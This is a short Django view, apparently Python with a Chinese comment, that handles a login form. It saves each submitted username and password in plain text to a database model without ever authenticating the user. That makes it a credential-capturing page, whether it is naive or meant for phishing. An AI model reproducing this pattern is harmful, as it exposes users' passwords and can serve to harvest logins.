from django.shortcuts import render
from .models import LoginRecord

def login_page(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        LoginRecord.objects.create(username=username, password=password)
        # 這裡您可以將使用者導向成功或失敗頁面，或執行其他操作
    return render(request, 'login.html')

